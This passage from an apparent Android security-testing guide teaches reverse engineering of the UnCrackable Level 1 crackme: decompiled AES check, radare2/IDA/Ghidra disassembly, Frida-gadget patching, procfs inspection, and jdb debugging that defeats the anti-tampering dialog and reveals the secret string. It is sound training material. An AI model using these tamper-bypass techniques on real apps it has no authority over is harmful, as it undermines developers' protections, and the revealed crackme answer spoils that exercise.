    \KeywordTok{public} \DataTypeTok{static} \DataTypeTok{boolean} \FunctionTok{check\_input}\NormalTok{(}\BuiltInTok{String}\NormalTok{ string) \{}
        \DataTypeTok{byte}\NormalTok{[] arrby = Base64.}\FunctionTok{decode}\NormalTok{((}\BuiltInTok{String}\NormalTok{)}\StringTok{"5UJiFctbmgbDoLXmpL12mkno8HT4Lv8dlat8FxR2GOc="}\NormalTok{, (}\DataTypeTok{int}\NormalTok{)}\DecValTok{0}\NormalTok{);}
        \DataTypeTok{byte}\NormalTok{[] arrby2 = }\KeywordTok{new} \DataTypeTok{byte}\NormalTok{[]\{\};}
        \KeywordTok{try}\NormalTok{ \{}
\NormalTok{            arrby = sg.}\FunctionTok{vantagepoint}\NormalTok{.}\FunctionTok{a}\NormalTok{.}\FunctionTok{a}\NormalTok{.}\FunctionTok{a}\NormalTok{(}\BuiltInTok{Validator}\NormalTok{.}\FunctionTok{b}\NormalTok{(}\StringTok{"8d127684cbc37c17616d806cf50473cc"}\NormalTok{), arrby);}
\NormalTok{            arrby2 = arrby;}
\NormalTok{        \}sa}
        \KeywordTok{catch}\NormalTok{ (}\BuiltInTok{Exception}\NormalTok{ exception) \{}
\NormalTok{            Log.}\FunctionTok{d}\NormalTok{((}\BuiltInTok{String}\NormalTok{)}\StringTok{"CodeCheck"}\NormalTok{, (}\BuiltInTok{String}\NormalTok{)(}\StringTok{"AES error:"}\NormalTok{ + exception.}\FunctionTok{getMessage}\NormalTok{()));}
\NormalTok{        \}}
        \KeywordTok{if}\NormalTok{ (string.}\FunctionTok{equals}\NormalTok{(}\KeywordTok{new} \BuiltInTok{String}\NormalTok{(arrby2))) \{}
            \KeywordTok{return} \KeywordTok{true}\NormalTok{;}
\NormalTok{        \}}
        \KeywordTok{return} \KeywordTok{false}\NormalTok{;}
\NormalTok{    \}}
\end{Highlighting}
\end{Shaded}

So, you have a Base64-encoded String that's passed to the function
\texttt{a} in the package \texttt{sg.vantagepoint.a.a} (again,
everything is called \texttt{a}) along with something that looks
suspiciously like a hex-encoded encryption key (16 hex bytes = 128bit, a
common key length). What exactly does this particular \texttt{a} do?
Ctrl-click it to find out.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{public} \KeywordTok{class}\NormalTok{ a \{}
    \KeywordTok{public} \DataTypeTok{static} \DataTypeTok{byte}\NormalTok{[] }\FunctionTok{a}\NormalTok{(}\DataTypeTok{byte}\NormalTok{[] object, }\DataTypeTok{byte}\NormalTok{[] arrby) \{}
\NormalTok{        object = }\KeywordTok{new} \BuiltInTok{SecretKeySpec}\NormalTok{((}\DataTypeTok{byte}\NormalTok{[])object, }\StringTok{"AES/ECB/PKCS7Padding"}\NormalTok{);}
        \BuiltInTok{Cipher}\NormalTok{ cipher = }\BuiltInTok{Cipher}\NormalTok{.}\FunctionTok{getInstance}\NormalTok{(}\StringTok{"AES"}\NormalTok{);}
\NormalTok{        cipher.}\FunctionTok{init}\NormalTok{(}\DecValTok{2}\NormalTok{, (}\BuiltInTok{Key}\NormalTok{)object);}
        \KeywordTok{return}\NormalTok{ cipher.}\FunctionTok{doFinal}\NormalTok{(arrby);}
\NormalTok{    \}}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

Now you're getting somewhere: it's simply standard AES-ECB. Looks like
the Base64 string stored in \texttt{arrby1} in \texttt{check\_input} is
a ciphertext. It is decrypted with 128bit AES, then compared with the
user input. As a bonus task, try to decrypt the extracted ciphertext and
find the secret value!

A faster way to get the decrypted string is to add dynamic analysis.
We'll revisit UnCrackable App for Android Level 1 later to show how
(e.g.~in the Debugging section), so don't delete the project yet!

\hypertarget{reviewing-disassembled-native-code}{%
\subparagraph{Reviewing Disassembled Native
Code}\label{reviewing-disassembled-native-code}}

Following the example from ``Disassembling Native Code'' we will use
different disassemblers to review the disassembled native code.

radare2

Once you've opened your file in radare2 you should first get the address
of the function you're looking for. You can do this by listing or
getting information \texttt{i} about the symbols \texttt{s}
(\texttt{is}) and grepping (\texttt{\textasciitilde{}} radare2's
built-in grep) for some keyword, in our case we're looking for JNI
related symbols so we enter ``Java'':

\begin{verbatim}
$ r2 -A HelloWord-JNI/lib/armeabi-v7a/libnative-lib.so
...
[0x00000e3c]> is~Java
003 0x00000e78 0x00000e78 GLOBAL   FUNC   16 Java_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI
\end{verbatim}

The method can be found at address \texttt{0x00000e78}. To display its
disassembly simply run the following commands:

\begin{verbatim}
[0x00000e3c]> e emu.str=true;
[0x00000e3c]> s 0x00000e78
[0x00000e78]> af
[0x00000e78]> pdf
╭ (fcn) sym.Java_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI 12
│   sym.Java_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI (int32_t arg1);
│           ; arg int32_t arg1 @ r0
│           0x00000e78  ~   0268           ldr r2, [r0]                ; arg1
│           ;-- aav.0x00000e79:
│           ; UNKNOWN XREF from aav.0x00000189 (+0x3)
│           0x00000e79                    unaligned
│           0x00000e7a      0249           ldr r1, aav.0x00000f3c      ; [0xe84:4]=0xf3c aav.0x00000f3c
│           0x00000e7c      d2f89c22       ldr.w r2, [r2, 0x29c]
│           0x00000e80      7944           add r1, pc                  ; "Hello from C++" section..rodata
╰           0x00000e82      1047           bx r2
\end{verbatim}

Let's explain the previous commands:

\begin{itemize}
\tightlist
\item
  \texttt{e\ emu.str=true;} enables radare2's string emulation. Thanks
  to this, we can see the string we're looking for (``Hello from C++'').
\item
  \texttt{s\ 0x00000e78} is a \emph{seek} to the address
  \texttt{s\ 0x00000e78}, where our target function is located. We do
  this so that the following commands apply to this address.
\item
  \texttt{pdf} means \emph{print disassembly of function}.
\end{itemize}

Using radare2 you can quickly run commands and exit by using the flags
\texttt{-qc\ \textquotesingle{}\textless{}commands\textgreater{}\textquotesingle{}}.
From the previous steps we know already what to do so we will simply put
everything together:

\begin{verbatim}
$ r2 -qc 'e emu.str=true; s 0x00000e78; af; pdf' HelloWord-JNI/lib/armeabi-v7a/libnative-lib.so

╭ (fcn) sym.Java_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI 12
│   sym.Java_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI (int32_t arg1);
│           ; arg int32_t arg1 @ r0
│           0x00000e78      0268           ldr r2, [r0]                ; arg1
│           0x00000e7a      0249           ldr r1, [0x00000e84]        ; [0xe84:4]=0xf3c
│           0x00000e7c      d2f89c22       ldr.w r2, [r2, 0x29c]
│           0x00000e80      7944           add r1, pc                  ; "Hello from C++" section..rodata
╰           0x00000e82      1047           bx r2
\end{verbatim}

Notice that in this case we're not starting with the \texttt{-A} flag
not running \texttt{aaa}. Instead, we just tell radare2 to analyze that
one function by using the \emph{analyze function} \texttt{af} command.
This is one of those cases where we can speed up our workflow because
you're focusing on some specific part of an app.

The workflow can be further improved by using
\href{https://github.com/radareorg/r2ghidra-dec}{r2ghidra-dec}, a deep
integration of Ghidra decompiler for radare2. r2ghidra-dec generates
decompiled C code, which can aid in quickly analyzing the binary.

IDA Pro

We assume that you've successfully opened
\texttt{lib/armeabi-v7a/libnative-lib.so} in IDA pro. Once the file is
loaded, click into the ``Functions'' window on the left and press
\texttt{Alt+t} to open the search dialog. Enter ``java'' and hit enter.
This should highlight the
\texttt{Java\_sg\_vantagepoint\_helloworld\_MainActivity\_stringFromJNI}
function. Double-click the function to jump to its address in the
disassembly Window. ``Ida View-A'' should now show the disassembly of
the function.

\begin{figure}
\centering
\includegraphics[width=5.20833in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/863e10b9775e05477765e9cefdc94ea46693a266.jpg}
\caption{Images/Chapters/0x05c/helloworld\_stringfromjni.jpg}
\end{figure}

Not a lot of code there, but you should analyze it. The first thing you
need to know is that the first argument passed to every JNI function is
a JNI interface pointer. An interface pointer is a pointer to a pointer.
This pointer points to a function table: an array of even more pointers,
each of which points to a JNI interface function (is your head spinning
yet?). The function table is initialized by the Java VM and allows the
native function to interact with the Java environment.

\begin{figure}
\centering
\includegraphics[width=5.72917in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/c96d983d30cbabc7d3d5c2c7951de81c61d650c5.png}
\caption{Images/Chapters/0x05c/JNI\_interface.png}
\end{figure}

With that in mind, let's have a look at each line of assembly code.

\begin{verbatim}
LDR  R2, [R0]
\end{verbatim}

Remember: the first argument (in R0) is a pointer to the JNI function
table pointer. The \texttt{LDR} instruction loads this function table
pointer into R2.

\begin{verbatim}
LDR  R1, =aHelloFromC
\end{verbatim}

This instruction loads into R1 the PC-relative offset of the string
``Hello from C++''. Note that this string comes directly after the end
of the function block at offset 0xe84. Addressing relative to the
program counter allows the code to run independently of its position in
memory.

\begin{verbatim}
LDR.W  R2, [R2, #0x29C]
\end{verbatim}

This instruction loads the function pointer from offset 0x29C into the
JNI function pointer table pointed to by R2. This is the
\texttt{NewStringUTF} function. You can look at the list of function
pointers in jni.h, which is included in the Android NDK. The function
prototype looks like this:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{jstring     (*NewStringUTF)(JNIEnv*, }\DataTypeTok{const} \DataTypeTok{char}\NormalTok{*);}
\end{Highlighting}
\end{Shaded}

The function takes two arguments: the JNIEnv pointer (already in R0) and
a String pointer. Next, the current value of PC is added to R1,
resulting in the absolute address of the static string ``Hello from
C++'' (PC + offset).

\begin{verbatim}
ADD  R1, PC
\end{verbatim}

Finally, the program executes a branch instruction to the
\texttt{NewStringUTF} function pointer loaded into R2:

\begin{verbatim}
BX   R2
\end{verbatim}

When this function returns, R0 contains a pointer to the newly
constructed UTF string. This is the final return value, so R0 is left
unchanged and the function returns.

Ghidra

After opening the library in Ghidra we can see all the functions defined
in the \textbf{Symbol Tree} panel under \textbf{Functions}. The native
library for the current application is relatively very small. There are
three user defined functions: \texttt{FUN\_001004d0},
\texttt{FUN\_0010051c}, and
\texttt{Java\_sg\_vantagepoint\_helloworldjni\_MainActivity\_stringFromJNI}.
The other symbols are not user defined and are generated for proper
functioning of the shared library. The instructions in the function
\texttt{Java\_sg\_vantagepoint\_helloworldjni\_MainActivity\_stringFromJNI}
are already discussed in detail in previous sections. In this section we
can look into the decompilation of the function.

Inside the current function there is a call to another function, whose
address is obtained by accessing an offset in the \texttt{JNIEnv}
pointer (found as \texttt{plParm1}). This logic has been
diagrammatically demonstrated above as well. The corresponding C code
for the disassembled function is shown in the \textbf{Decompiler}
window. This decompiled C code makes it much easier to understand the
function call being made. Since this function is small and extremely
simple, the decompilation output is very accurate, this can change
drastically when dealing with complex functions.

\begin{figure}
\centering
\includegraphics[width=5.20833in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/a910215ed46dba7e8f1cef010443d3ffce923f4a.png}
\caption{Images/Chapters/0x05c/Ghidra\_decompiled\_function.png}
\end{figure}

\hypertarget{automated-static-analysis}{%
\paragraph{Automated Static Analysis}\label{automated-static-analysis}}

You should use tools for efficient static analysis. They allow the
tester to focus on the more complicated business logic. A plethora of
static code analyzers are available, ranging from open source scanners
to full-blown enterprise-ready scanners. The best tool for the job
depends on budget, client requirements, and the tester's preferences.

Some static analyzers rely on the availability of the source code;
others take the compiled APK as input. Keep in mind that static
analyzers may not be able to find all problems by themselves even though
they can help us focus on potential problems. Review each finding
carefully and try to understand what the app is doing to improve your
chances of finding vulnerabilities.

Configure the static analyzer properly to reduce the likelihood of false
positives and maybe only select several vulnerability categories in the
scan. The results generated by static analyzers can otherwise be
overwhelming, and your efforts can be counterproductive if you must
manually investigate a large report.

There are several open source tools for automated security analysis of
an APK.

\begin{itemize}
\tightlist
\item
  \href{https://github.com/linkedin/qark/}{QARK}
\item
  \href{https://github.com/AndroBugs/AndroBugs_Framework}{Androbugs}
\item
  \href{https://github.com/flankerhqd/JAADAS}{JAADAS}
\item
  \href{https://github.com/MobSF/Mobile-Security-Framework-MobSF}{MobSF}
\end{itemize}

For commercial tools, see the section
``\href{0x08-Testing-Tools.md\#static-source-code-analysis-commercial-tools}{Static
Source Code Analysis (Commercial Tools)}'' in the chapter ``Testing
Tools''.

\hypertarget{dynamic-analysis-8}{%
\subsubsection{Dynamic Analysis}\label{dynamic-analysis-8}}

Dynamic Analysis tests the mobile app by executing and running the app
binary and analyzing its workflows for vulnerabilities. For example,
vulnerabilities regarding data storage might be sometimes hard to catch
during static analysis, but in dynamic analysis you can easily spot what
information is stored persistently and if the information is protected
properly. Besides this, dynamic analysis allows the tester to properly
identify:

\begin{itemize}
\tightlist
\item
  Business logic flaws
\item
  Vulnerabilities in the tested environments
\item
  Weak input validation and bad input/output encoding as they are
  processed through one or multiple services
\end{itemize}

Analysis can be assisted by automated tools, such as
\href{https://github.com/MobSF/Mobile-Security-Framework-MobSF/}{MobSF},
while assessing an application. An application can be assessed by
side-loading it, re-packaging it, or by simply attacking the installed
version.

\hypertarget{dynamic-analysis-on-non-rooted-devices}{%
\paragraph{Dynamic Analysis on Non-Rooted
Devices}\label{dynamic-analysis-on-non-rooted-devices}}

Non-rooted devices provide the tester with two benefits:

\begin{itemize}
\tightlist
\item
  Replicate an environment that the application is intended to run on.
\item
  Thanks to tools like objection, you can patch the app in order to test
  it like if you were on a rooted device (but of course being jailed to
  that one app).
\end{itemize}

In order to dynamically analyze the application, you can also rely on
\href{https://github.com/sensepost/objection}{objection} which is
leveraging Frida. However, in order to be able to use objection on
non-rooted devices you have to perform one additional step:
\href{https://github.com/sensepost/objection/wiki/Patching-Android-Applications\#patching---patching-an-apk}{patch
the APK} to include the \href{https://www.frida.re/docs/gadget/}{Frida
gadget} library. Objection communicates then using a Python API with the
mobile phone through the installed Frida gadget.

In order to accomplish this, the following commands can set you up and
running:

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Download the Uncrackable APK}
\NormalTok{$ }\FunctionTok{wget}\NormalTok{ https://raw.githubusercontent.com/OWASP/owasp{-}mstg/master/Crackmes/Android/Level\_01/UnCrackable{-}Level1.apk}
\CommentTok{\# Patch the APK with the Frida Gadget}
\NormalTok{$ }\ExtensionTok{objection}\NormalTok{ patchapk {-}{-}source UnCrackable{-}Level1.apk}
\CommentTok{\# Install the patched APK on the android phone}
\NormalTok{$ }\ExtensionTok{adb}\NormalTok{ install UnCrackable{-}Level1.objection.apk}
\CommentTok{\# After running the mobile phone, objection will detect the running frida{-}server through the APK}
\NormalTok{$ }\ExtensionTok{objection}\NormalTok{ explore}
\end{Highlighting}
\end{Shaded}

\hypertarget{basic-information-gathering-1}{%
\paragraph{Basic Information
Gathering}\label{basic-information-gathering-1}}

As mentioned previously, Android runs on top of a modified Linux kernel
and retains the
\href{https://www.kernel.org/doc/Documentation/filesystems/proc.txt}{proc
filesystem} (procfs) from Linux, which is mounted at \texttt{/proc}.
Procfs provides a directory-based view of a process running on the
system, providing detailed information about the process itself, its
threads, and other system-wide diagnostics. Procfs is arguably one of
the most important filesystems on Android, where many OS native tools
depend on it as their source of information.

Many command line tools are not shipped with the Android firmware to
reduce the size, but can be easily installed on a rooted device using
BusyBox. We can also create our own custom scripts using commands like
\texttt{cut}, \texttt{grep}, \texttt{sort} etc, to parse the proc
filesystem information.

In this section, we will be using information from procfs directly or
indirectly to gather information about a running process.

\hypertarget{open-files}{%
\subparagraph{Open Files}\label{open-files}}

You can use \texttt{lsof} with the flag
\texttt{-p\ \textless{}pid\textgreater{}} to return the list of open
files for the specified process. See the
\href{http://man7.org/linux/man-pages/man8/lsof.8.html}{man page} for
more options.

\begin{verbatim}
# lsof -p 6233
COMMAND     PID       USER   FD      TYPE             DEVICE  SIZE/OFF       NODE NAME
.foobar.c  6233     u0_a97  cwd       DIR                0,1         0          1 /
.foobar.c  6233     u0_a97  rtd       DIR                0,1         0          1 /
.foobar.c  6233     u0_a97  txt       REG             259,11     23968        399 /system/bin/app_process64
.foobar.c  6233     u0_a97  mem   unknown                                         /dev/ashmem/dalvik-main space (region space) (deleted)
.foobar.c  6233     u0_a97  mem       REG              253,0   2797568    1146914 /data/dalvik-cache/arm64/system@framework@boot.art
.foobar.c  6233     u0_a97  mem       REG              253,0   1081344    1146915 /data/dalvik-cache/arm64/system@framework@boot-core-libart.art
...
\end{verbatim}

In the above output, the most relevant fields for us are:

\begin{itemize}
\tightlist
\item
  \texttt{NAME}: path of the file.
\item
  \texttt{TYPE}: type of the file, for example, file is a directory or a
  regular file.
\end{itemize}

This can be extremely useful to spot unusual files when monitoring
applications using obfuscation or other anti-reverse engineering
techniques, without having to reverse the code. For instance, an
application might be performing encryption-decryption of data and
storing it in a file temporarily.

\hypertarget{open-connections}{%
\subparagraph{Open Connections}\label{open-connections}}

You can find system-wide networking information in \texttt{/proc/net} or
just by inspecting the \texttt{/proc/\textless{}pid\textgreater{}/net}
directories (for some reason not process specific). There are multiple
files present in these directories, of which \texttt{tcp}, \texttt{tcp6}
and \texttt{udp} might be considered relevant from the tester's
perspective.

\begin{verbatim}
# cat /proc/7254/net/tcp
sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
...
69: 1101A8C0:BB2F 9A447D4A:01BB 01 00000000:00000000 00:00000000 00000000 10093        0 75412 1 0000000000000000 20 3 19 10 -1
70: 1101A8C0:917C E3CB3AD8:01BB 01 00000000:00000000 00:00000000 00000000 10093        0 75553 1 0000000000000000 20 3 23 10 -1
71: 1101A8C0:C1E3 9C187D4A:01BB 01 00000000:00000000 00:00000000 00000000 10093        0 75458 1 0000000000000000 20 3 19 10 -1
...
\end{verbatim}

In the output above, the most relevant fields for us are:

\begin{itemize}
\tightlist
\item
  \texttt{rem\_address}: remote address and port number pair (in
  hexadecimal representation).
\item
  \texttt{tx\_queue} and \texttt{rx\_queue}: the outgoing and incoming
  data queue in terms of kernel memory usage. These fields give an
  indication how actively the connection is being used.
\item
  \texttt{uid}: containing the effective UID of the creator of the
  socket.
\end{itemize}

Another alternative is to use the \texttt{netstat} command, which also
provides information about the network activity for the complete system
in a more readable format, and can be easily filtered as per our
requirements. For instance, we can easily filter it by PID:

\begin{verbatim}
# netstat -p | grep 24685
Active Internet connections (w/o servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program Name
tcp        0      0 192.168.1.17:47368      172.217.194.103:https   CLOSE_WAIT  24685/com.google.android.youtube
tcp        0      0 192.168.1.17:47233      172.217.194.94:https    CLOSE_WAIT  24685/com.google.android.youtube
tcp        0      0 192.168.1.17:38480      sc-in-f100.1e100.:https ESTABLISHED 24685/com.google.android.youtube
tcp        0      0 192.168.1.17:44833      74.125.24.91:https      ESTABLISHED 24685/com.google.android.youtube
tcp        0      0 192.168.1.17:38481      sc-in-f100.1e100.:https ESTABLISHED 24685/com.google.android.youtube
...
\end{verbatim}

\texttt{netstat} output is clearly more user friendly than reading
\texttt{/proc/\textless{}pid\textgreater{}/net}. The most relevant
fields for us, similar to the previous output, are following:

\begin{itemize}
\tightlist
\item
  \texttt{Foreign\ Address}: remote address and port number pair (port
  number can be replaced with the well-known name of a protocol
  associated with the port).
\item
  \texttt{Recv-Q} and \texttt{Send-Q}: Statistics related to receive and
  send queue. Gives an indication on how actively the connection is
  being used.
\item
  \texttt{State}: the state of a socket, for example, if the socket is
  in active use (\texttt{ESTABLISHED}) or closed (\texttt{CLOSED}).
\end{itemize}

\hypertarget{loaded-native-libraries}{%
\subparagraph{Loaded Native Libraries}\label{loaded-native-libraries}}

The file \texttt{/proc/\textless{}pid\textgreater{}/maps} contains the
currently mapped memory regions and their access permissions. Using this
file we can get the list of the libraries loaded in the process.

\begin{verbatim}
# cat /proc/9568/maps
12c00000-52c00000 rw-p 00000000 00:04 14917                              /dev/ashmem/dalvik-main space (region space) (deleted)
6f019000-6f2c0000 rw-p 00000000 fd:00 1146914                            /data/dalvik-cache/arm64/system@framework@boot.art
...
7327670000-7329747000 r--p 00000000 fd:00 1884627                        /data/app/com.google.android.gms-4FJbDh-oZv-5bCw39jkIMQ==/oat/arm64/base.odex
..
733494d000-7334cfb000 r-xp 00000000 fd:00 1884542                        /data/app/com.google.android.youtube-Rl_hl9LptFQf3Vf-JJReGw==/lib/arm64/libcronet.80.0.3970.3.so
...
\end{verbatim}

\hypertarget{sandbox-inspection}{%
\subparagraph{Sandbox Inspection}\label{sandbox-inspection}}

The application data is stored in a sandboxed directory present at
\texttt{/data/data/\textless{}app\_package\_name\textgreater{}}. The
content of this directory has already been discussed in detail in the
``\href{0x05b-Basic-Security_Testing.md\#accessing-app-data-directories}{Accessing
App Data Directories}'' section.

\hypertarget{debugging}{%
\paragraph{Debugging}\label{debugging}}

So far, you've been using static analysis techniques without running the
target apps. In the real world, especially when reversing malware or
more complex apps, pure static analysis is very difficult. Observing and
manipulating an app during runtime makes it much, much easier to
decipher its behavior. Next, we'll have a look at dynamic analysis
methods that help you do just that.

Android apps support two different types of debugging: Debugging on the
level of the Java runtime with the Java Debug Wire Protocol (JDWP), and
Linux/Unix-style ptrace-based debugging on the native layer, both of
which are valuable to reverse engineers.

\hypertarget{debugging-release-apps}{%
\subparagraph{Debugging Release Apps}\label{debugging-release-apps}}

Dalvik and ART support the JDWP, a protocol for communication between
the debugger and the Java virtual machine (VM) that it debugs. JDWP is a
standard debugging protocol that's supported by all command line tools
and Java IDEs, including jdb, JEB, IntelliJ, and Eclipse. Android's
implementation of JDWP also includes hooks for supporting extra features
implemented by the Dalvik Debug Monitor Server (DDMS).

A JDWP debugger allows you to step through Java code, set breakpoints on
Java methods, and inspect and modify local and instance variables.
You'll use a JDWP debugger most of the time you debug ``normal'' Android
apps (i.e., apps that don't make many calls to native libraries).

In the following section, we'll show how to solve the UnCrackable App
for Android Level 1 with jdb alone. Note that this is not an
\emph{efficient} way to solve this crackme. Actually you can do it much
faster with Frida and other methods, which we'll introduce later in the
guide. This, however, serves as an introduction to the capabilities of
the Java debugger.

\hypertarget{debugging-with-jdb}{%
\subparagraph{Debugging with jdb}\label{debugging-with-jdb}}

The \texttt{adb} command line tool was introduced in the
``\href{0x05b-Basic-Security_Testing.md}{Android Basic Security
Testing}'' chapter. You can use its \texttt{adb\ jdwp} command to list
the process IDs of all debuggable processes running on the connected
device (i.e., processes hosting a JDWP transport). With the
\texttt{adb\ forward} command, you can open a listening socket on your
host machine and forward this socket's incoming TCP connections to the
JDWP transport of a chosen process.

\begin{verbatim}
$ adb jdwp
12167
$ adb forward tcp:7777 jdwp:12167
\end{verbatim}

You're now ready to attach jdb. Attaching the debugger, however, causes
the app to resume, which you don't want. You want to keep it suspended
so that you can explore first. To prevent the process from resuming,
pipe the \texttt{suspend} command into jdb:

\begin{verbatim}
$ { echo "suspend"; cat; } | jdb -attach localhost:7777
Initializing jdb ...
> All threads suspended.
>
\end{verbatim}

You're now attached to the suspended process and ready to go ahead with
the jdb commands. Entering \texttt{?} prints the complete list of
commands. Unfortunately, the Android VM doesn't support all available
JDWP features. For example, the \texttt{redefine} command, which would
let you redefine a class' code is not supported. Another important
restriction is that line breakpoints won't work because the release
bytecode doesn't contain line information. Method breakpoints do work,
however. Useful working commands include:

\begin{itemize}
\tightlist
\item
  classes: list all loaded classes
\item
  class/methods/fields \emph{class id}: Print details about a class and
  list its methods and fields
\item
  locals: print local variables in current stack frame
\item
  print/dump \emph{expr}: print information about an object
\item
  stop in \emph{method}: set a method breakpoint
\item
  clear \emph{method}: remove a method breakpoint
\item
  set \emph{lvalue} = \emph{expr}: assign new value to
  field/variable/array element
\end{itemize}

Let's revisit the decompiled code from the UnCrackable App for Android
Level 1 and think about possible solutions. A good approach would be
suspending the app in a state where the secret string is held in a
variable in plain text so you can retrieve it. Unfortunately, you won't
get that far unless you deal with the root/tampering detection first.

Review the code and you'll see that the method
\texttt{sg.vantagepoint.uncrackable1.MainActivity.a} displays the ``This
in unacceptable\ldots{}'' message box. This method creates an
\texttt{AlertDialog} and sets a listener class for the \texttt{onClick}
event. This class (named \texttt{b}) has a callback method will
terminates the app once the user taps the ``OK'' button. To prevent the
user from simply canceling the dialog, the \texttt{setCancelable} method
is called.

\begin{Shaded}
\begin{Highlighting}[]
  \KeywordTok{private} \DataTypeTok{void} \FunctionTok{a}\NormalTok{(}\DataTypeTok{final} \BuiltInTok{String}\NormalTok{ title) \{}
        \DataTypeTok{final}\NormalTok{ AlertDialog create = }\KeywordTok{new}\NormalTok{ AlertDialog$}\FunctionTok{Builder}\NormalTok{((}\BuiltInTok{Context}\NormalTok{)}\KeywordTok{this}\NormalTok{).}\FunctionTok{create}\NormalTok{();}
\NormalTok{        create.}\FunctionTok{setTitle}\NormalTok{((}\BuiltInTok{CharSequence}\NormalTok{)title);}
\NormalTok{        create.}\FunctionTok{setMessage}\NormalTok{((}\BuiltInTok{CharSequence}\NormalTok{)}\StringTok{"This in unacceptable. The app is now going to exit."}\NormalTok{);}
\NormalTok{        create.}\FunctionTok{setButton}\NormalTok{({-}}\DecValTok{3}\NormalTok{, (}\BuiltInTok{CharSequence}\NormalTok{)}\StringTok{"OK"}\NormalTok{, (DialogInterface$OnClickListener)}\KeywordTok{new} \FunctionTok{b}\NormalTok{(}\KeywordTok{this}\NormalTok{));}
\NormalTok{        create.}\FunctionTok{setCancelable}\NormalTok{(}\KeywordTok{false}\NormalTok{);}
\NormalTok{        create.}\FunctionTok{show}\NormalTok{();}
\NormalTok{    \}}
\end{Highlighting}
\end{Shaded}

You can bypass this with a little runtime tampering. With the app still
suspended, set a method breakpoint on
\texttt{android.app.Dialog.setCancelable} and resume the app.

\begin{verbatim}
> stop in android.app.Dialog.setCancelable
Set breakpoint android.app.Dialog.setCancelable
> resume
All threads resumed.
>
Breakpoint hit: "thread=main", android.app.Dialog.setCancelable(), line=1,110 bci=0
main[1]
\end{verbatim}

The app is now suspended at the first instruction of the
\texttt{setCancelable} method. You can print the arguments passed to
\texttt{setCancelable} with the \texttt{locals} command (the arguments
are shown incorrectly under ``local variables'').

\begin{verbatim}
main[1] locals
Method arguments:
Local variables:
flag = true
\end{verbatim}

\texttt{setCancelable(true)} was called, so this can't be the call we're
looking for. Resume the process with the \texttt{resume} command.

\begin{verbatim}
main[1] resume
Breakpoint hit: "thread=main", android.app.Dialog.setCancelable(), line=1,110 bci=0
main[1] locals
flag = false
\end{verbatim}

You've now reached a call to \texttt{setCancelable} with the argument
\texttt{false}. Set the variable to \texttt{true} with the \texttt{set}
command and resume.

\begin{verbatim}
main[1] set flag = true
 flag = true = true
main[1] resume
\end{verbatim}

Repeat this process, setting \texttt{flag} to \texttt{true} each time
the breakpoint is reached, until the alert box is finally displayed (the
breakpoint will be reached five or six times). The alert box should now
be cancelable! Tap the screen next to the box and it will close without
terminating the app.

Now that the anti-tampering is out of the way, you're ready to extract
the secret string! In the ``static analysis'' section, you saw that the
string is decrypted with AES, then compared with the string input to the
message box. The method \texttt{equals} of the \texttt{java.lang.String}
class compares the string input with the secret string. Set a method
breakpoint on \texttt{java.lang.String.equals}, enter an arbitrary text
string in the edit field, and tap the ``verify'' button. Once the
breakpoint is reached, you can read the method argument with the
\texttt{locals} command.

\begin{verbatim}
> stop in java.lang.String.equals
Set breakpoint java.lang.String.equals
>
Breakpoint hit: "thread=main", java.lang.String.equals(), line=639 bci=2

main[1] locals
Method arguments:
Local variables:
other = "radiusGravity"
main[1] cont

Breakpoint hit: "thread=main", java.lang.String.equals(), line=639 bci=2

main[1] locals
Method arguments:
Local variables:
other = "I want to believe"
main[1] cont
\end{verbatim}

This is the plaintext string you're looking for!

\hypertarget{debugging-with-an-ide}{%
\subparagraph{Debugging with an IDE}\label{debugging-with-an-ide}}

Setting up a project in an IDE with the decompiled sources is a neat
trick that allows you to set method breakpoints directly in the source
code. In most cases, you should be able single-step through the app and
inspect the state of variables with the GUI. The experience won't be
perfect---it's not the original source code after all, so you won't be
able to set line breakpoints and things will sometimes simply not work
correctly. Then again, reversing code is never easy, and efficiently
navigating and debugging plain old Java code is a pretty convenient way
of doing it. A similar method has been described in the
\href{https://blog.netspi.com/attacking-android-applications-with-debuggers/}{NetSPI
blog}.

To set up IDE debugging, first create your Android project in IntelliJ
and copy the decompiled Java sources into the source folder as described
above in the
``\protect\hyperlink{reviewing-decompiled-java-code}{Reviewing
Decompiled Java Code}'' section. On the device, choose the app as
``debug app'' on the ``Developer options'' (Uncrackable1 in this
tutorial), and make sure you've switched on the ``Wait For Debugger''
feature.

Once you tap the Uncrackable app icon from the launcher, it will be
suspended in ``Wait For Debugger'' mode.

\begin{figure}
\centering
\includegraphics[width=3.125in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/e72654a6a7c90c6599aa37ed6e7a31b0b4a8953c.png}
\caption{Waiting For Debugger}
\end{figure}

Now you can set breakpoints and attach to the Uncrackable1 app process
with the ``Attach Debugger'' toolbar button.

\begin{figure}
\centering
\includegraphics[width=5.72917in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/d706835a0a613f7a1c3657d0e4f6cef4a1eb2fd4.png}
\caption{Images/Chapters/0x05c/set\_breakpoint\_and\_attach\_debugger.png}
\end{figure}

Note that only method breakpoints work when debugging an app from
decompiled sources. Once a method breakpoint is reached, you'll get the
chance to single step during the method execution.

\begin{figure}
\centering
\includegraphics[width=3.125in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/06ba7913ac1a2b0a4aa6772f5a46f958090cfcf4.png}
\caption{Choose Process}
\end{figure}

After you choose the Uncrackable1 application from the list, the
debugger will attach to the app process and you'll reach the breakpoint
that was set on the \texttt{onCreate} method. Uncrackable1 app triggers
anti-debugging and anti-tampering controls within the \texttt{onCreate}
method. That's why setting a breakpoint on the \texttt{onCreate} method
just before the anti-tampering and anti-debugging checks are performed
is a good idea.

Next, single-step through the \texttt{onCreate} method by clicking
``Force Step Into'' in Debugger view. The ``Force Step Into'' option
allows you to debug the Android framework functions and core Java
